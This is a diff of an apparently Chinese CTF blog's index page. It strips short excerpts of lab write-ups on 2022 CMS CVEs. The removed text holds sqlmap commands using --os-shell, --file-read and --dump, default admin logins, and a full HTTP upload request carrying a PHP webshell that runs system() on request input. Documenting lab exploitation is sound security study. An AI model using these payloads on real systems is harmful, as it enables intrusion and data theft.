@@ -60,7 +60,7 @@
                 <span class="nav-text">CTF</span>
             </a>
         
-            <a class="nav-item" href="/tags/PTE">
+            <a class="nav-item" href="/tags/%E6%B8%97%E9%80%8F">
                 <span class="nav-text">渗透</span>
             </a>
         
@@ -163,9 +163,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：AtomCMS SQL注入漏洞</p>
-<p>写了半天shell，读了半天文件，这次flag反而在数据库里。</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-24223/#more">
@@ -207,9 +205,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：Victor CMS v1.0 &#x2F;includes&#x2F;login.php 存在sql注入</p>
-<p>使用sqlmap跑，但flag不在数据库中，尝试写入shell失败，路径不对，使用<code>--file-read</code>命令读取服务器的任意文件，这里读取<code>/flag</code>，之后sqlmap会将flag下载到本地</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-28060/#more">
@@ -251,9 +247,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：taoCMS v3.0.2 文件管理处存在任意文件上传漏洞，攻击者可执行任意代码</p>
-<p>为了得到flag的话跟2022-25578的做法一样 改index.php为一句话 蚁剑</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-23880/#more">
@@ -295,9 +289,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：Atom CMS v2.0存在sql注入漏洞在&#x2F;admin&#x2F;ajax&#x2F;avatar.php页面</p>
-<p>sqlmap一把梭 参数是id，直接–os-shell</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-25488/#more">
@@ -339,10 +331,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：Pluck-CMS-Pluck-4.7.16 后台RCE</p>
-<p>进入容器，点击admin，输入密码：admin</p>
-<p>去官网找主题，解压下来将主题的info.php里插入一句话，重新压缩，上传主题，在&#x2F;data&#x2F;themes下访问带有恶意代码的info.php，蚁剑getshell</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-26965/#more">
@@ -384,9 +373,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p>
-<p>进入容器，点击管理，用户名密码：admin&#x2F;tao，点击文件管理→.htaccess→编辑→插入payload:<code>AddType application/x-httpd-php .php3</code>，然后建立个新文件写入一句话，但是这里不知道为什么无法新建文件，直接修改index.php的内容为一句话访问，蚁剑getshell</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-25578/#more">
@@ -428,10 +415,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。</p>
-<p>直接访问容器的&#x2F;single.php，sqlmap直接跑</p>
-<p><code>sqlmap -u http://eci-2zea7obo5nr8m0vghlwo.cloudeci1.ichunqiu.com/single.php?id=1 -D ctf -T flag -C flag --dump</code></p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-28512/#more">
@@ -473,9 +457,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：ED01-CMS v20180505 存在任意文件上传漏洞</p>
-<p>admin&#x2F;admin登陆，漏洞描述在<code>/admin/users.php?source=edit_user&amp;id=1</code>存在文件上传，访问发现是个编辑用户信息的页面，传一句话图片马抓包，蚁剑getshell</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-28525/#more">
@@ -517,9 +499,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：WSO2文件上传漏洞（CVE-2022-29464）是Orange Tsai发现的WSO2上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意JSP文件在WSO2服务器上获得RCE。</p>
-<p>打开容器，exp直接打，然后访问马地址 cat &#x2F;flag</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-29464/#more">
@@ -561,13 +541,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p>
-<p>exp：<code>https://packetstormsecurity.com/files/166786/Pharmacy-Management-System-1.0-Shell-Upload.html</code></p>
-<p>开启容器，给了一个登陆界面，尝试登陆，发现没有账号，在这卡了有点久。访问<code>/php_action/editProductImage.php</code>回显localhost拒绝了请求，以为需要登录后才可以用，其实不需要，直接访问抓包写入shell就可以了</p>
-<p>报文如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zea7obo5nr8fk1t72p4.cloudeci1.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; ci_session=0eb1aac78dc3ba42607ab8cf31c270ec25c7b37d; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1663293722,1664166096,1665551946,1665735159; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1665735163; PHPSESSID=e63668ifbfptj7h0nsu0odo64t</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------208935235035266125502673738631</span><br><span class="line">Content-Length: 556</span><br><span class="line"></span><br><span class="line">-----------------------------208935235035266125502673738631</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------208935235035266125502673738631</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if($_REQUEST[&#x27;s&#x27;]) &#123;</span><br><span class="line">  system($_REQUEST[&#x27;s&#x27;]);</span><br><span class="line">  &#125; else phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">-----------------------------208935235035266125502673738631</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------208935235035266125502673738631--</span><br></pre></td></tr></table></figure>
-<p>返回<code>Image uploaded successfully&#123;&quot;success&quot;:true,&quot;messages&quot;:&quot;Successfully Updated&quot;&#125;</code>，然后在<code>/assets/myimages/shell.php?s=</code>传s，执行任意代码</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-30887/#more">
@@ -609,15 +583,7 @@
     
     <section class="article-body markdown-body">
         
-        <p>漏洞描述：该CMS的welcome.php中存在SQL注入攻击。</p>
-<p>开启环境，随便注册个账号，在第二项的Ip Networking点击Start抓包，保存包信息为1.txt，并使用sqlmap跑</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --dbs ---batch --random-agent -p eid</span><br><span class="line">------------------------------------------------------</span><br><span class="line">web application technology: PHP 7.2.20</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)</span><br><span class="line">available databases [4]:</span><br><span class="line">[*] ctf</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] mysql</span><br><span class="line">[*] performance_schema</span><br></pre></td></tr></table></figure>
-<p>得到了数据库名，继续爆表名、列名、获取字段</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt -D ctf --batch --random-agent -p eid</span><br><span class="line">----------------------------------------------------</span><br><span class="line">Database: ctf</span><br><span class="line">[9 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| rank      |</span><br><span class="line">| user      |</span><br><span class="line">| admin     |</span><br><span class="line">| answer    |</span><br><span class="line">| flag      |</span><br><span class="line">| <span class="built_in">history</span>   |</span><br><span class="line">| options   |</span><br><span class="line">| questions |</span><br><span class="line">| quiz      |</span><br><span class="line">+-----------+</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line">sqlmap -r 1.txt -D ctf -T flag --columns --batch --random-agent -p eid</span><br><span class="line">----------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Database: ctf</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+---------------+</span><br><span class="line">| Column | Type          |</span><br><span class="line">+--------+---------------+</span><br><span class="line">| flag   | varchar(1024) |</span><br><span class="line">+--------+---------------+</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">sqlmap -r 1.txt -D ctf -T flag -C flag --dump --batch --random-agent -p eid</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">Database: ctf</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag                                       |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag&#123;b90b289c-0dc7-47c9-b6c8-80a7698873cc&#125; |</span><br><span class="line">+--------------------------------------------+</span><br></pre></td></tr></table></figure>
-<p>漏洞分析：该框架是web based quiz system v1.0的漏洞，在welcome.php页面存在sql注入漏洞，源码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (@<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] == <span class="string">&#x27;quiz&#x27;</span> &amp;&amp; @<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$eid</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;eid&#x27;</span>];</span><br><span class="line">        <span class="variable">$sn</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>];</span><br><span class="line">        <span class="variable">$total</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line">        <span class="variable">$q</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>, <span class="string">&quot;SELECT * FROM questions WHERE eid=&#x27;<span class="subst">$eid</span>&#x27; AND sn=&#x27;<span class="subst">$sn</span>&#x27; &quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div class = &quot;panel&quot; style= &quot;margin:5%&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$q</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$qns</span> = <span class="variable">$row</span>[<span class="string">&#x27;qns&#x27;</span>];</span><br><span class="line">            <span class="variable">$qid</span> = <span class="variable">$row</span>[<span class="string">&#x27;qid&#x27;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;b&gt;Question &amp;nbsp;&#x27;</span>.<span class="variable">$sn</span>.<span class="string">&#x27;&amp;nbsp;::&lt;br /&gt;&lt;br /&gt;&#x27;</span>.<span class="variable">$qns</span>.<span class="string">&#x27;&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<p>eid可控，构造sql语句传入到mysqli_query即可达成sql注入</p>
-
+        <p>…</p>
         
         <p class="article-more-link">
             <a href="/2023/03/30/CVE-2022-32991/#more">
